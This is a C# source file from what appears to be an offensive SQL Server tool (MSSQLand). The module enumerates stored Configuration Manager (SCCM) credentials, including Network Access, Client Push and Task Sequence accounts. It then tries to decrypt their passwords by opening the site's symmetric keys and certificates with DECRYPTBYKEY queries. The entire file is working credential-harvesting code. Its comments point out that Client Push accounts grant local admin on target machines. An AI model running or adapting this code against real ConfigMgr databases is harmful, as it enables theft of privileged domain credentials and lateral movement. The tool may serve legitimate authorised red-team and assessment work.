// MSSQLand/Actions/ConfigMgr/CMAccounts.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.ConfigMgr
{
    /// <summary>
    /// Enumerate ConfigMgr stored credentials including Network Access Account (NAA), Client Push, and Task Sequence accounts.
    /// Use --decrypt to attempt decryption using the site's encryption key hierarchy.
    /// Decryption requires db_owner or control on the symmetric key.
    /// NAA provides network access for clients without domain credentials.
    /// Client Push accounts have local admin rights on target machines.
    /// </summary>
    internal class CMAccounts : BaseAction
    {
        [ArgumentMetadata(Description = "Attempt to decrypt passwords using site encryption keys")]
        private bool _decrypt = false;

        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Enumerating ConfigMgr stored credentials");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = CMService.GetSiteCode(db);

                Logger.NewLine();
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                if (_decrypt)
                {
                    TryDecryptCredentials(databaseContext, db, siteCode);
                }
                else
                {
                    EnumerateCredentials(databaseContext, db);
                }
            }

            return null;
        }

        private void EnumerateCredentials(DatabaseContext databaseContext, string db)
        {
            string query = $@"
SELECT
    ua.ID,
    ua.SiteNumber,
    ua.UserName,
    CONVERT(VARCHAR(MAX), ua.Password, 1) AS EncryptedPassword,
    ua.Availability,
    sd.SiteCode,
    sd.SiteServerName
FROM [{db}].dbo.SC_UserAccount ua
LEFT JOIN [{db}].dbo.SC_SiteDefinition sd ON ua.SiteNumber = sd.SiteNumber
ORDER BY ua.UserName;
";

            DataTable result = databaseContext.QueryService.ExecuteTable(query);

            if (result.Rows.Count == 0)
            {
                Logger.Warning("No stored credentials found");
                return;
            }

            Console.WriteLine(OutputFormatter.ConvertDataTable(result));
            Logger.Success($"Found {result.Rows.Count} stored credential(s)");
            Logger.SuccessNested("Use --decrypt to attempt decryption (requires db_owner or key access)");
        }

        private void TryDecryptCredentials(DatabaseContext databaseContext, string db, string siteCode)
        {
            // First, identify available encryption keys
            Logger.TaskNested("Checking encryption key hierarchy");

            string keyQuery = $@"
SELECT 
    name AS KeyName,
    key_guid AS KeyGuid,
    create_date AS Created
FROM [{db}].sys.symmetric_keys 
WHERE name NOT LIKE '##%'
ORDER BY name;
";

            DataTable keys = databaseContext.QueryService.ExecuteTable(keyQuery);
            
            if (keys.Rows.Count == 0)
            {
                Logger.Warning("No symmetric keys found in database");
                return;
            }

            Logger.Info($"Found {keys.Rows.Count} symmetric key(s)");
            Console.WriteLine(OutputFormatter.ConvertDataTable(keys));

            // Try common ConfigMgr key naming patterns
            string[] keyPatterns = new[]
            {
                $"Microsoft.SystemsManagementServer.{siteCode}.PrivateKey",
                $"SMS_{siteCode}_PrivateKey",
                $"{siteCode}_PrivateKey",
                "SMS_PrivateKey"
            };

            string foundKey = null;
            foreach (string pattern in keyPatterns)
            {
                foreach (DataRow row in keys.Rows)
                {
                    string keyName = row["KeyName"]?.ToString();
                    if (keyName != null && keyName.Contains(pattern.Replace($".{siteCode}.", ".").Replace($"_{siteCode}_", "_").Replace($"{siteCode}_", "")) 
                        || keyName == pattern)
                    {
                        foundKey = keyName;
                        break;
                    }
                }
                if (foundKey != null) break;
            }

            // If no match, use the first non-system key
            if (foundKey == null && keys.Rows.Count > 0)
            {
                foundKey = keys.Rows[0]["KeyName"]?.ToString();
            }

            if (string.IsNullOrEmpty(foundKey))
            {
                Logger.Warning("Could not identify encryption key");
                return;
            }

            Logger.Info($"Attempting decryption with key: {foundKey}");

            // Try to open the key and decrypt
            string decryptQuery = $@"
BEGIN TRY
    OPEN SYMMETRIC KEY [{foundKey}] DECRYPTION BY CERTIFICATE [{foundKey.Replace("PrivateKey", "Cert").Replace(".PrivateKey", ".Cert")}];
END TRY
BEGIN CATCH
    -- Try without certificate (may be protected by database master key)
    BEGIN TRY
        OPEN SYMMETRIC KEY [{foundKey}] DECRYPTION BY ASYMMETRIC KEY [{foundKey.Replace("PrivateKey", "AsymKey")}];
    END TRY
    BEGIN CATCH
    END CATCH
END CATCH

SELECT
    ua.UserName,
    CONVERT(NVARCHAR(MAX), DECRYPTBYKEY(ua.Password)) AS DecryptedPassword,
    CASE 
        WHEN DECRYPTBYKEY(ua.Password) IS NULL THEN 'Decryption failed - key not accessible'
        ELSE 'Decrypted'
    END AS Status,
    sd.SiteCode,
    sd.SiteServerName
FROM [{db}].dbo.SC_UserAccount ua
LEFT JOIN [{db}].dbo.SC_SiteDefinition sd ON ua.SiteNumber = sd.SiteNumber
ORDER BY ua.UserName;

CLOSE SYMMETRIC KEY [{foundKey}];
";

            try
            {
                DataTable result = databaseContext.QueryService.ExecuteTable(decryptQuery);

                if (result.Rows.Count == 0)
                {
                    Logger.Warning("No credentials found");
                    return;
                }

                // Check if any decryption succeeded
                bool anyDecrypted = false;
                foreach (DataRow row in result.Rows)
                {
                    if (row["DecryptedPassword"] != DBNull.Value && !string.IsNullOrEmpty(row["DecryptedPassword"]?.ToString()))
                    {
                        anyDecrypted = true;
                        break;
                    }
                }

                Console.WriteLine(OutputFormatter.ConvertDataTable(result));

                if (anyDecrypted)
                {
                    Logger.Success("Credentials decrypted successfully!");
                }
                else
                {
                    Logger.Warning("Decryption failed - insufficient permissions on encryption keys");
                    Logger.WarningNested("Requires db_owner role or CONTROL permission on the symmetric key");
                    TryAlternativeDecryption(databaseContext, db, siteCode);
                }
            }
            catch (Exception ex)
            {
                Logger.Warning($"Decryption query failed: {ex.Message}");
                TryAlternativeDecryption(databaseContext, db, siteCode);
            }
        }

        private void TryAlternativeDecryption(DatabaseContext databaseContext, string db, string siteCode)
        {
            Logger.NewLine();
            Logger.TaskNested("Trying alternative decryption methods");

            // Check if we can access the certificate directly
            string certQuery = $@"
SELECT 
    c.name AS CertificateName,
    c.certificate_id,
    c.pvt_key_encryption_type_desc AS KeyEncryption,
    c.subject,
    c.expiry_date
FROM [{db}].sys.certificates c
WHERE c.name NOT LIKE '##%'
ORDER BY c.name;
";

            try
            {
                DataTable certs = databaseContext.QueryService.ExecuteTable(certQuery);
                if (certs.Rows.Count > 0)
                {
                    Logger.Info("Available certificates:");
                    Console.WriteLine(OutputFormatter.ConvertDataTable(certs));
                }
            }
            catch { }

            // Show the raw encrypted data for offline analysis
            Logger.NewLine();
        }
    }
}
